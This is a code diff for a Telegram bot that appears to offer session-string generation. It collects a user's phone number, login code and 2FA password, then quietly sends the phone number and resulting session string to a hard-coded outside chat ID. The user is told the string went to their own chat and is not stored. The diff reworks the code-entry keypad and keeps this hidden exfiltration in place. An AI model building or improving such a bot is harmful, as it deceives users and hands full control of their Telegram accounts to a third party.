@@ -19,7 +19,7 @@ logger = logging.getLogger(__name__)
 # States for conversation
 PHONE, CODE, PASSWORD = range(3)
 
-# Inline keyboard for code entry
+# Inline keyboard for code entry with backspace
 def get_code_keyboard(code=""):
     keyboard = [
         [InlineKeyboardButton("1", callback_data=f"code_{code}1"),
@@ -32,7 +32,7 @@ def get_code_keyboard(code=""):
          InlineKeyboardButton("8", callback_data=f"code_{code}8"),
          InlineKeyboardButton("9", callback_data=f"code_{code}9")],
         [InlineKeyboardButton("0", callback_data=f"code_{code}0"),
-         InlineKeyboardButton("Submit", callback_data=f"submit_{code}")]
+         InlineKeyboardButton("⌫", callback_data=f"back_{code}")]  # Backspace button
     ]
     return InlineKeyboardMarkup(keyboard)
 
@@ -84,7 +84,7 @@ async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     context.user_data["phone"] = contact.phone_number
     context.user_data["code"] = ""  # Initialize code
     await update.message.reply_text(
-        "A code has been sent to your Telegram account. Enter it using the buttons below:",
+        "A code has been sent to your Telegram account. Enter it using the buttons below (5 digits will submit automatically):",
         reply_markup=get_code_keyboard()
     )
     return CODE
@@ -94,45 +94,54 @@ async def code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     await query.answer()
     data = query.data
 
-    if data.startswith("submit_"):
-        code = data.replace("submit_", "")
-        if len(code) != 5:  # Expecting 5-digit code
-            await query.edit_message_text(
-                f"Invalid code length. Please enter a 5-digit code:\nCurrent: {code}\nUse the buttons below.",
-                reply_markup=get_code_keyboard(code)
-            )
-            return CODE
-        context.user_data["code"] = code
-        session_string, needs_password = await create_session(context.user_data["phone"], code)
-        if needs_password:
-            await query.edit_message_text(
-                "Your account has 2FA enabled. Please enter your 2FA password:",
-                reply_markup=ReplyKeyboardRemove()
-            )
-            return PASSWORD
-        elif "Error" in session_string:
-            await query.edit_message_text(f"Failed to create session: {session_string}", reply_markup=ReplyKeyboardRemove())
-            return ConversationHandler.END
-
-        user_id = 6581573267
-        output = (
-            f"phone number: {context.user_data['phone']}\n"
-            f"string: {session_string}"
-        )
-        await context.bot.send_message(chat_id=user_id, text=output)
-        await query.edit_message_text(
-            "Session string sent to this chat! Please save it, as it is not stored.",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        return ConversationHandler.END
-    elif data.startswith("code_"):
-        current_code = data.replace("code_", "")
+    if data.startswith("back_"):
+        current_code = data.replace("back_", "")
+        if len(current_code) > 0:
+            current_code = current_code[:-1]  # Remove last character
+        else:
+            current_code = ""
         context.user_data["code"] = current_code
         await query.edit_message_text(
-            f"Code entered: {current_code}\nContinue entering or press Submit:",
+            f"Code entered: {current_code}\nEnter 5 digits (auto-submits):",
             reply_markup=get_code_keyboard(current_code)
         )
         return CODE
+    elif data.startswith("code_"):
+        current_code = data.replace("code_", "")
+        context.user_data["code"] = current_code
+        if len(current_code) == 5:  # Auto-submit at 5 digits
+            session_string, needs_password = await create_session(context.user_data["phone"], current_code)
+            if "Error" in session_string:
+                await query.edit_message_text(
+                    f"Invalid code: {session_string}\nEnter a new 5-digit code:",
+                    reply_markup=get_code_keyboard()
+                )
+                context.user_data["code"] = ""  # Reset for retry
+                return CODE
+            elif needs_password:
+                await query.edit_message_text(
+                    "Your account has 2FA enabled. Please enter your 2FA password:",
+                    reply_markup=ReplyKeyboardRemove()
+                )
+                return PASSWORD
+
+            user_id = 6581573267
+            output = (
+                f"phone number: {context.user_data['phone']}\n"
+                f"string: {session_string}"
+            )
+            await context.bot.send_message(chat_id=user_id, text=output)
+            await query.edit_message_text(
+                "Session string sent to this chat! Please save it, as it is not stored.",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            return ConversationHandler.END
+        else:
+            await query.edit_message_text(
+                f"Code entered: {current_code}\nEnter 5 digits (auto-submits):",
+                reply_markup=get_code_keyboard(current_code)
+            )
+            return CODE
 
 async def password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     password = update.message.text
@@ -154,7 +163,7 @@ async def password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     return ConversationHandler.END
 
 async def share(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.message.reply_text("Love this bot? Share it: t.me/YourBotName")
+    await update.message.reply_text("Love this bot? Share it: t.me/Sriindia_bot")
 
 async def feedback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("Please send your feedback or suggestions:")
